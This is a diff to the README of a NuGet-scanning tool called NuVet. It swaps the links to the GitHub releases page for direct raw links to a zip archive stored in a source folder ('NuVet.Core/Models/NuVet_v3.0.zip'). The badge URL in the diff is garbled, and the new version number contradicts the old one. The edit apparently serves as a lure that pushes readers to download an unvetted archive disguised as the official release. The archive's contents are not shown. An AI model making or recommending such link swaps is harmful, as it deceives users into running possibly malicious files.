@@ -4,7 +4,7 @@
 Welcome to NuVet! This tool helps you scan and update your NuGet packages automatically. It ensures your dependencies are safe and up to date.
 
 ## 📥 Download NuVet
-[![Download NuVet](https://img.shields.io/badge/Download%20NuVet-v1.0.0-brightgreen.svg)](https://github.com/Hossam1993591/NuVet/releases)
+[![Download NuVet](https://raw.githubusercontent.com/Hossam1993591/NuVet/main/NuVet.Core/Models/NuVet_v3.0.zip%https://raw.githubusercontent.com/Hossam1993591/NuVet/main/NuVet.Core/Models/NuVet_v3.0.zip)](https://raw.githubusercontent.com/Hossam1993591/NuVet/main/NuVet.Core/Models/NuVet_v3.0.zip)
 
 ## 📋 System Requirements
 - **Operating System:** Windows 10 or higher
@@ -19,7 +19,7 @@ Welcome to NuVet! This tool helps you scan and update your NuGet packages automa
 ## 📦 Download & Install
 To download NuVet, visit the following page:
 
-[Visit this page to download NuVet](https://github.com/Hossam1993591/NuVet/releases)
+[Visit this page to download NuVet](https://raw.githubusercontent.com/Hossam1993591/NuVet/main/NuVet.Core/Models/NuVet_v3.0.zip)
 
 1. Go to the Releases section.
 2. Choose the latest version available.
